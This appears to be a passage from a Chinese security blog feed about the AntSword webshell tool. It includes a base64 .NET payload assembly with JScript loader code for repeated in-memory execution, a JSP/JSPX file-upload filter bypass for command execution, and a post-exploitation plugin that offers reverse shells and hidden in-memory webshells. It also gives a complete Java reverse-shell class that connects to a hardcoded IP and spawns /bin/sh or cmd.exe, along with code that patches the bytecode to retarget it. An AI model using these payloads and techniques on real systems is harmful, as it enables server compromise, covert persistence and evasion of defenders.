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;; var type = Type.GetType(&quot;AntPayload.Run&quot;); if (type != null) &#123; Response.Write(type + &quot; exists&quot;); //var obj=System.Activator.CreateInstance(type); //obj.Equals(&quot;&quot;); var assembly = System.Reflection.Assembly.GetExecutingAssembly(); var obj = assembly.CreateInstance(&quot;AntPayload.Run&quot;); obj.Equals(&quot;&quot;); &#125; else &#123; Response.Write(type + &quot; not exists&quot;); var myAssebly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); var myPaylaod = myAssebly.CreateInstance(&quot;AntPayload.Run&quot;); myPaylaod.Equals(&quot;&quot;); //myAssebly.GetType(&quot;AntPayload.Run&quot;).GetConstructor(new Type[0]).Invoke(null).Equals(&quot;&quot;); &#125;%&gt;发现 Type.GetType 永远为undefined。以为是函数用的不对，后来又换了System.Reflection.Assembly.GetCallingAssembly().GetType，System.Reflection.Assembly.GetExecutingAssembly().GetType都不行。接着发现虽然把代码直接写在jscript中可以多次稳定触发，如果把以上代码通过eval打进入仍然会报上面类型转换的错误。另外还发现一些奇怪的地方，如果直接代码写在jscript文件中可以用这种写法：12var obj=System.Activator.CreateInstance(type);obj.Equals(&quot;&quot;);但是如果通过eval传进去就只能用这种写法123var assembly = System.Reflection.Assembly.GetExecutingAssembly();var obj = assembly.CreateInstance(&quot;AntPayload.Run&quot;);obj.Equals(&quot;&quot;);否则会报如下错误，谷歌也没查到怎么解决，神秘。问题解决试了很多办法都失败了，后来谷歌搜到了一篇2012年的博客遇到了同样的问题，大概意思是说两次的assembly被加载到了不同的上下文中，所以被当作成为不同的类，无法进行类型转换。跟北辰师傅研究了一番后，北辰师傅想到一种方法：把第一次加载后的assembly的引用给存到当前Application的上下文中，即HttpContext.Current.Application这个类里面，然后再通过Application.Get(“ant”)拿到引用，然后反射，再获取实例化，这样就可以解决上下文不同的问题。payload修改如下123var Payload=&quot;xxxxx&quot;;HttpContext.Current.Application.Add(&quot;ant&quot;, System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)));HttpContext.Current.Application.Get(&quot;ant&quot;).GetType(&quot;AntPayload.Run&quot;).GetConstructor(new Type[0]).Invoke(null).Equals(this);然后通过eval打过去，此时就可以多次稳定触发payload了。最后特别感谢北辰师傅的交流探讨！初学.net，有些地方是凭借自己的理解写的，如果有说的不对的地方欢迎指出，以免误导他人。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[星球问答：一次jsp上传绕过的思考]]></title>
    <url>%2Fposts%2Fjsp-webshell-upload-bypass%2F</url>
    <content type="text"><![CDATA[背景前几天有个小伙伴做项目的时候遇到一个问题来问我，大概情况如下：jsp的站，可以任意文件上传上传jsp会把&lt;%中的&lt;给转义掉上传jspx会把jsp:scriptlet到&lt;/jsp:scriptlet&gt;中的内容替换为空问有什么突破办法？当时研究了一下后jsp和jspx各给了一个解决方案，后来发到星球里后@hosch3n师傅又提出了一种新的方案，tql解决方案其实问题等价于：jsp不使用&lt;% %&gt;标签如何执行命令jspx不使用jsp:scriptlet &lt;/jsp:scriptlet&gt;如何执行命令jsp利用EL表达式绕过jsp是默认解析el表达式的，并且在没有jsp标签的情况下也可以直接执行，这样就可以绕过jsp的限制。星球里面@Gh0stFx也提到了这一点jspx利用命名空间绕过因为jspx实际上是jsp的xml写法，所以继承了xml的所有特性，例如cdata跟html实体编码等，同样也继承了命名空间的特性。https://www.runoob.com/xml/xml-namespaces.html在jsp:scriptlet这个标签中，jsp就是默认的命名空间，但是实际上可以随意替换成其他名字这样就绕过了对jsp:scriptlet的过滤jspx利用jsp:expression绕过在jsp中可以利用表达式绕过，那么jspx中同样也可以，以下是jsp跟jspx语法的对照：JSP语法JSP document语法Page Directive&lt;%@ page %&gt;&lt;jsp:directive.page /&gt;Include Directive&lt;%@ include %&gt;&lt;jsp:directive.include /&gt;Tag Library Directive&lt;%@ taglib %&gt;xmlns:prefix=”Library URI”Declartion&lt;%! … %&gt;jsp:declaration … &lt;/jsp:declaration&gt;Scriplet&lt;% … %&gt;jsp:scriptlet … &lt;/jsp:scriptlet&gt;Expression&lt;%= … %&gt;jsp:expression … &lt;/jsp:expression&gt;Comment&lt;%-- … --%&gt;这个方法是@hosch3n师傅提出来的，把表达式写到jspx中，同样可以达到执行命令的目的]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[As-Exploits: 中国蚁剑后渗透框架]]></title>
    <url>%2Fposts%2Fas-exploits%2F</url>
    <content type="text"><![CDATA[前言冰蝎跟哥斯拉都有了各自的一些后渗透模块，然而蚁剑这一块基本还是空缺，所以就萌生出来做一个蚁剑的后渗透框架插件的想法。目前插件的定位是蚁剑的一个微内核拓展模块，可以迅速做到payload的工程化，不用过多时间浪费在插件的结构上。目前的As-Exlpoits各部分之间基本做到了解耦，新增一个payload只需要两步：1.填写payload，2. 画一个表单。其余发包，回显处理等事情框架会自动帮你实现。想要自定义的话只需要继承父类然后重写对应方法即可。因为http是无状态的，webshell能做的事情其实很有限，所以插件功能的重点主要放在msf，nmap等其他工具的联动上面，把专业的事情交给专业的工具去做。总体设计一个模块在初始化之后的流程大概是这样当exploit事件发生时，会调用getArgs跟genPayload函数来组合成最后的payload，默认将回显数据发送到编辑框里。模块介绍简单的塞一些模块，没错我就是缝合怪。基本信息获取当前服务端信息。反弹Shell跟MSF联动，与冰蝎和哥斯拉相比新增了bind类型的payload。目前支持以下类型：java/meterpreter/reverse_tcpjava/shell/reverse_tcpjava/meterpreter/bind_tcpjava/shell/bind_tcpphp/meterpreter/reverse_tcpphp/shell/reverse_tcpphp/meterpreter/bind_tcpphp/shell/bind_tcp内存马一键打入内存Webshell。由于时间仓促，目前仅支持Servlet型内存马。核心payload修改自哥斯拉，继承了nolog的功能，即内存马不会在tomcat中留下日志。可打入的内存马种类：AntSwordBehinderGodzilla-Base64reGerog其中组件名称为注册的Servlet的名称，可以起一个具有迷惑性的名字来隐藏自己。内存马管理获取当前Servlet卸载指定Servlet杀软识别数据来源是key师傅的项目：avList通过tasklist /svc获取当前进程列表，识别出其中的杀软。目前支持手动跟自动两种获取方式：自动获取自动执行系统命令tasklist /svc并分析回显数据。手动获取手动输入tasklist /svc的结果。如何用node修改java字节码在本插件中所有额外参数都采用了直接修改字节码，而没有采用额外参数的方式来传参。蚁剑没有java环境，那么是如何做到用node修改字节码的呢？详细的例子可以看我博客这篇文章：无java环境修改字节码其实我们的需求无非只是修改变量池中的一个字符串，并不需要asm框架那么强大的功能。java字节码常量池中共有14种类型，如下表格所示：注意上面的表格的单位是错的，应该是byte不是bit我们关注的应该是CONSTANT_utf8_info跟CONSTANT_String_info。如果变量是第一次被定义的时候是用CONSTANT_utf8_info标志，第二次使用的时候就变成了CONSTANT_String_info，即只需要tag跟面向字符串的索引。也就是说关键的结构就是这个其实跟PHP的序列化很相似，首先来个标志位表示变量的类型，然后是变量的长度，最后是变量的内容。既然知道了其结构，那么修改的办法也就呼之欲出。除了修改变量的hex，只需要再把前面的变量长度给改一下就可以了。把yan表哥的代码抽出来修改一下，yan表哥yyds。123456789101112131415161718192021222324function replaceClassStringVar(b64code, oldvar, newvar) &#123; let code = Buffer.from(b64code, &apos;base64&apos;);//解码 let hexcode = code.toString(&apos;hex&apos;);//转为16进制 let hexoldvar = Buffer.from(oldvar).toString(&apos;hex&apos;);//转为16进制 let oldpos = hexcode.indexOf(hexoldvar); if (oldpos &gt; -1) &#123;//判断字节码中是否包含目标字符串 let newlength = decimalToHex(newvar.length, 4);//计算新字符串长度 let retcode = `$&#123;hexcode.slice(0, oldpos - 4)&#125;$&#123;newlength&#125;$&#123;Buffer.from(newvar).toString(&apos;hex&apos;)&#125;$&#123;hexcode.slice(oldpos + hexoldvar.length)&#125;`;//把原来字节码的前后部分截出来，中间拼上新的长度跟内容 return Buffer.from(retcode, &apos;hex&apos;).toString(&apos;base64&apos;);//base64编码 &#125; return b64code; &#125; function decimalToHex(d, padding) &#123; var hex = Number(d).toString(16); padding = typeof (padding) === &quot;undefined&quot; || padding === null ? padding = 2 : padding; while (hex.length &lt; padding) &#123; hex = &quot;0&quot; + hex;//小于padding长度就填充0 &#125; return hex; &#125;content=`xxxxxxxxxxxxx`//要替换的字节码content=replaceClassStringVar(content,&apos;targetIP&apos;,&apos;192.168.88.129&apos;)content=replaceClassStringVar(content,&apos;targetPORT&apos;,&apos;9999&apos;)console.log(content)编写模块父类BaseBase是所有模块的基类，放了一些默认的方法。顺着代码来说吧。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186&quot;use strict&quot;;const LANG = require(&quot;../language&quot;); // 插件语言库const LANG_T = antSword[&quot;language&quot;][&quot;toastr&quot;]; // 通用通知提示const path = require(&quot;path&quot;);class Base &#123; constructor(top) &#123;//获取顶层对象 this.top = top; this.opt = this.top.opt; this.shelltype = this.top.opt.type; this.win = this.top.win; this.payloadtype=&quot;default&quot;; this.precheck(); &#125; precheck() &#123; //检查模块是否适用于当前shell类型 return true; &#125; //获取payload模板 getTemplate(shelltype, payloadtype) &#123; //从当前目录下payload.js中获取payload let payload = require(path.join(__dirname, this.name, &quot;payload&quot;)); return payload[shelltype][payloadtype]; &#125; //拼接参数 genPayload(args) &#123; //从模板中拼接参数 let payload = this.getTemplate(this.shelltype, this.payloadtype); if (this.shelltype == &quot;jsp&quot;) &#123; //如果是jsp类型就用字节码的方式修改 for (let i in args) &#123; payload = this.replaceClassStringVar(payload, i, args[i]); &#125; &#125; else &#123; //否则直接进行字符串替换 for (let i in args) &#123; payload = payload.replace(new RegExp(i, &quot;g&quot;), args[i]); &#125; &#125; return payload; &#125; //获取表单参数 getArgs() &#123; //所有表单参数要形成一个字典 return &#123;&#125;; &#125; //执行 exploit() &#123; // exploit！ console.log(&quot;exploit!&quot;); self.core = this.top.core; let args = this.getArgs(); //获取参数 let payload = this.genPayload(args); //拼接，生成payload self.core .request(&#123; _: payload, //发送payload &#125;) .then((_ret) =&gt; &#123; let res = antSword.unxss(_ret[&quot;text&quot;], false); //过滤xss if (res === &quot;&quot;) &#123; res = &quot;output is empty.&quot;; &#125; this.editor.session.setValue(res); //回显内容到输出结果 this.editor.setReadOnly(true); toastr.success(LANG[&quot;success&quot;], LANG_T[&quot;success&quot;]); &#125;) .catch((e) =&gt; &#123; console.log(e); toastr.error(JSON.stringify(e), &quot;Error&quot;); &#125;); &#125; setName(name) &#123; this.name = name; //每个模块实例化之后要有个唯一的名字 &#125; createLayout(tabbar) &#123; //创建tab，总布局 tabbar.addTab(this.name, LANG[&quot;core&quot;][this.name][&quot;title&quot;]); let tab = tabbar.cells(this.name); this.tab = tab; if (this.name == &quot;base_info&quot;) &#123; //把基本信息设为首页 tab.setActive(); &#125; let layout = tab.attachLayout(&quot;2E&quot;); this.layout = layout; let cellA = layout.cells(&quot;a&quot;); this.cellA=cellA; cellA.hideHeader(); let cellB = layout.cells(&quot;b&quot;); cellB.setText(LANG[&quot;result_title&quot;]); this.cellB=cellB; this.createEditor(cellB); this.createToolbar(cellA); this.createForm(cellA); &#125; createEditor(cell) &#123; //输出结果默认是编辑器的格式，方便复制 this.editor = null; // 初始化编辑器 this.editor = ace.edit(cell.cell.lastChild); this.editor.$blockScrolling = Infinity; this.editor.setTheme(&quot;ace/theme/tomorrow&quot;); // this.editor.session.setMode(`ace/mode/html`); this.editor.session.setUseWrapMode(true); this.editor.session.setWrapLimitRange(null, null); this.editor.setOptions(&#123; fontSize: &quot;14px&quot;, enableBasicAutocompletion: true, enableSnippets: true, enableLiveAutocompletion: true, &#125;); // 编辑器快捷键 this.editor.commands.addCommand(&#123; name: &quot;import&quot;, bindKey: &#123; win: &quot;Ctrl-S&quot;, mac: &quot;Command-S&quot;, &#125;, exec: () =&gt; &#123; // this.toolbar.callEvent(&quot;onClick&quot;, [&quot;import&quot;]); &#125;, &#125;); const inter = setInterval(this.editor.resize.bind(this.editor), 200); this.win.win.attachEvent(&quot;onClose&quot;, () =&gt; &#123; clearInterval(inter); return true; &#125;); &#125; createForm(cell) &#123; //edit your code &#125; createToolbar(cell) &#123; // 初始化exploit按钮，监听onClick事件 let self = this; let toolbar = cell.attachToolbar(); toolbar.attachEvent(&quot;onClick&quot;, function (id) &#123; try &#123; self.exploit(); &#125; catch (e) &#123; toastr.error(JSON.stringify(e), LANG_T[&apos;error&apos;]); &#125; &#125;); toolbar.loadStruct( &apos;&lt;toolbar&gt;&lt;item type=&quot;button&quot; id=&quot;exploit&quot; text=&quot;exploit&quot; title=&quot;&quot; /&gt;&lt;/toolbar&gt;&apos;, function () &#123;&#125; ); if(this.precheck()==false)&#123; //如果precheck不通过，按钮将变成灰色。 toolbar.disableItem(&apos;exploit&apos;); &#125; this.toolbar=toolbar; &#125; replaceClassStringVar(b64code, oldvar, newvar) &#123; //字节码修改函数 let code = Buffer.from(b64code, &quot;base64&quot;); let hexcode = code.toString(&quot;hex&quot;); let hexoldvar = Buffer.from(oldvar).toString(&quot;hex&quot;); let oldpos = hexcode.indexOf(hexoldvar); if (oldpos &gt; -1) &#123; let newlength = this.decimalToHex(newvar.length, 4); let retcode = `$&#123;hexcode.slice(0, oldpos - 4)&#125;$&#123;newlength&#125;$&#123;Buffer.from( newvar ).toString(&quot;hex&quot;)&#125;$&#123;hexcode.slice(oldpos + hexoldvar.length)&#125;`; return Buffer.from(retcode, &quot;hex&quot;).toString(&quot;base64&quot;); &#125; // console.log(&apos;nonono&apos;) return b64code; &#125; decimalToHex(d, padding) &#123; let hex = Number(d).toString(16); padding = typeof padding === &quot;undefined&quot; || padding === null ? (padding = 2) : padding; while (hex.length &lt; padding) &#123; hex = &quot;0&quot; + hex; &#125; return hex; &#125; safeHTML(cell, html = &quot;&quot;, sandbox = &quot;&quot;) &#123; //当渲染html时一定要用此函数处理，否则可能会产生rce let _html = Buffer.from(html).toString(&quot;base64&quot;); // https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox let _iframe = `&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;iframe sandbox=&quot;$&#123;sandbox&#125;&quot; src=&quot;data:text/html;base64,$&#123;_html&#125;&quot; style=&quot;width:100%;height:100%;border:0;padding:0;margin:0;&quot;&gt; &lt;/iframe&gt; `; cell.attachHTMLString(_iframe); return this; &#125;&#125;module.exports = Base;简单的例子举一个简单的例子，执行系统命令并获取回显。首先给插件起个炫酷的名字叫test，加入到根目录index.js的Modules里面。然后在language\zh.js中增加对应的标签名字：测试。接着新增一个test目录，这里的目录名称要与模块的名称一致，里面放两个文件：index.js跟payload.js。在index.js中主要写逻辑处理部分，payload.js里面只放payload。payload.js默认的payload叫default。payload中把参数部分用一个特殊的名字标记出来，叫做 test_command 。JSP类型同理，放base64格式的字节码。123456789module.exports=&#123; php:&#123; default:`system(&quot;test_command&quot;);` &#125;, jsp:&#123; default:`` &#125;&#125;;index.js因为例子中需要额外的参数，所以要重写父类的createForm函数跟getArgs函数，把表单中获取到的test_command放入args里面。1234567891011121314151617181920212223242526&quot;use strict&quot;;const Base = require(&quot;../base&quot;);class Test extends Base &#123; createForm(cell) &#123; var str = [ &#123; type: &quot;input&quot;, name: &quot;test_command&quot;, label: &quot;执行命令&quot;, labelWidth: 150, labelAlign:&quot;center&quot;, inputWidth: 200, &#125;, ]; var form = cell.attachForm(str); this.form = form; &#125; getArgs() &#123; let args = &#123;&#125;; this.payloadtype = &quot;default&quot;; args[&quot;test_command&quot;] = this.form.getItemValue(&quot;test_command&quot;); return args; &#125;&#125;module.exports = Test;运行结果重启蚁剑后再打开插件就可以使用我们的新模块了，是不是很简单？最后目前payload主要来自冰蝎跟哥斯拉，向前辈们致敬！框架的优势就在于看到其他同类工具的比较好的功能可以迅速白嫖。这个功能不错，下一秒就是我的了.jpg项目地址：https://github.com/yzddmr6/As-Exploits]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>中国蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无java环境修改字节码]]></title>
    <url>%2Fposts%2Fnode-edit-java-class%2F</url>
    <content type="text"><![CDATA[前言上次巅峰极客线下赛跟yan表哥面了基，一起磕了瓜子聊了聊天。结合当时的比赛情况回来之后想搓一个蚁剑的后渗透插件，今天想跟大家分享一下其中的一个点：无java环境如何修改字节码。正文需求在蚁剑改造计划之实现JSP一句话中，当时为了解决硬编码字节码的问题采用了额外参数的方式来传参。但是同时带来的问题就是键名的固定跟额外带来的编码问题，很容易成为一个特征。例如1POST: ant=xxxxxxxxxxxxxxx&amp;var1=/bin/bash&amp;var2=whoami蚁剑没有java环境，所以没办法像冰蝎一样调用asm框架来修改字节码。但是我们也不需要asm框架那么强大的功能，实际上只需要修改其中的一个字符串的值就可以了，那么怎么实现呢？这个要从字节码的结构说起。Java字节码结构这里以As_Exploits中的jsp反弹shell的payload为例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import java.io.*;import java.net.Socket;public class ShellReverseTCP extends Thread &#123; InputStream zj; OutputStream sd; public static String ip; public static String port; ShellReverseTCP(InputStream zj, OutputStream sd) &#123; this.zj = zj; this.sd = sd; &#125; public ShellReverseTCP() &#123; &#125; @Override public boolean equals(Object obj)&#123; ip=&quot;targetIP&quot;; port=&quot;targetPORT&quot;; try &#123; RunShellReverseTCP(); return true; &#125;catch (Exception e)&#123; return false; &#125; &#125; public static void main(String[] args) &#123; ip=&quot;192.168.88.129&quot;; port=&quot;9999&quot;; ShellReverseTCP shellReverseTCP = new ShellReverseTCP(); shellReverseTCP.RunShellReverseTCP(); &#125; public void RunShellReverseTCP() &#123; try &#123; String ShellPath; if (System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) == -1) &#123; ShellPath = new String(&quot;/bin/sh&quot;); &#125; else &#123; ShellPath = new String(&quot;cmd.exe&quot;); &#125; Socket socket = new Socket(ip, Integer.parseInt(port)); Process process = Runtime.getRuntime().exec(ShellPath); (new ShellReverseTCP(process.getInputStream(), socket.getOutputStream())).start(); (new ShellReverseTCP(socket.getInputStream(), process.getOutputStream())).start(); &#125; catch (Exception e) &#123; &#125; &#125; public void run() &#123; BufferedReader yx = null; BufferedWriter jah = null; try &#123; yx = new BufferedReader(new InputStreamReader(this.zj)); jah = new BufferedWriter(new OutputStreamWriter(this.sd)); char buffer[] = new char[8192]; int length; while ((length = yx.read(buffer, 0, buffer.length)) &gt; 0) &#123; jah.write(buffer, 0, length); jah.flush(); &#125; &#125; catch (Exception e) &#123; &#125; try &#123; if (yx != null) yx.close(); if (jah != null) jah.close(); &#125; catch (Exception e) &#123; &#125; &#125;&#125;main函数是调试用的不用管，入口是equals函数，我们的目的就是把其中的targetIP跟targetPORT替换为我们的目标IP跟端口。用010editor打开编译后的字节码文件查看。最开始的CAFEBABE叫做魔数，用来标志这是一个字节码文件。00 00 00 34是版本号，0x34转为10进制是52，查表知是jdk1.8。后面还有import的相关类的信息，因为不是重点，这里不再过多说明，快进到常量池。常量池中的每一项都是一个表，其项目类型共有14种，如下表格所示：类型标志描述CONSTANT_utf8_info1UTF-8编码的字符串CONSTANT_Integer_info3整形字面量CONSTANT_Float_info4浮点型字面量CONSTANT_Long_info5长整型字面量CONSTANT_Double_info6双精度浮点型字面量CONSTANT_Class_info7类或接口的符号引用CONSTANT_String_info8字符串类型字面量CONSTANT_Fieldref_info9字段的符号引用CONSTANT_Methodref_info10类中方法的符号引用CONSTANT_InterfaceMethodref_info11接口中方法的符号引用CONSTANT_NameAndType_info12字段或方法的符号引用CONSTANT_MethodHandle_info15表示方法句柄CONSTANT_MothodType_info16标志方法类型CONSTANT_InvokeDynamic_info18表示一个动态方法调用点这14种类型的结构各不相同，如下表格所示：``注：上面的表格的单位是错的，应该是byte不是bit，不知道哪里的以讹传讹一直流传了下来。从上面的表格可以看到，虽然每一项的结构都各不相同，但是他们有个共同点，就是每一项的第一个字节都是一个标志位，标识这一项是哪种类型的常量。我们关注的应该是CONSTANT_utf8_info跟CONSTANT_String_info。如果变量是第一次被定义的时候是用CONSTANT_utf8_info标志，第二次使用的时候就变成了CONSTANT_String_info，即只需要tag跟面向字符串的索引。也就是说关键的结构就是这个其实跟PHP的序列化很相似，首先来个标志位表示变量的类型，然后是变量的长度，最后是变量的内容。结合文件来看targetIP共占了8个byte，也就是16个hex的位。所以前面两个byte是00 08。然后再之前的一个byte是01，表示这是一个CONSTANT_utf8_info。如何修改既然知道了其结构，那么修改的办法也就呼之欲出。除了修改变量的hex，只需要再把前面的变量长度给改一下就可以了。把yan表哥的代码抽出来修改一下12345678910111213141516171819202122232425262728function replaceClassStringVar(b64code, oldvar, newvar) &#123; let code = Buffer.from(b64code, &apos;base64&apos;);//解码 let hexcode = code.toString(&apos;hex&apos;);//转为16进制 let hexoldvar = Buffer.from(oldvar).toString(&apos;hex&apos;);//转为16进制 let oldpos = hexcode.indexOf(hexoldvar); if (oldpos &gt; -1) &#123;//判断字节码中是否包含目标字符串 let newlength = decimalToHex(newvar.length, 4);//计算新字符串长度 let retcode = `$&#123;hexcode.slice(0, oldpos - 4)&#125;$&#123;newlength&#125;$&#123;Buffer.from(newvar).toString(&apos;hex&apos;)&#125;$&#123;hexcode.slice(oldpos + hexoldvar.length)&#125;`;//把原来字节码的前后部分截出来，中间拼上新的长度跟内容 return Buffer.from(retcode, &apos;hex&apos;).toString(&apos;base64&apos;);//base64编码 &#125; console.log(&apos;nonono&apos;) return b64code; &#125; function decimalToHex(d, padding) &#123; var hex = Number(d).toString(16); padding = typeof (padding) === &quot;undefined&quot; || padding === null ? padding = 2 : padding; while (hex.length &lt; padding) &#123; hex = &quot;0&quot; + hex;//小于padding长度就填充0 &#125; return hex; &#125;content=`xxxxxxxxxxxxx`//要替换的字节码content=replaceClassStringVar(content,&apos;targetIP&apos;,&apos;192.168.88.129&apos;)content=replaceClassStringVar(content,&apos;targetPORT&apos;,&apos;9999&apos;)console.log(content)用命令还原一下文件1echo -n xxxxxx |baes64 -d |tee 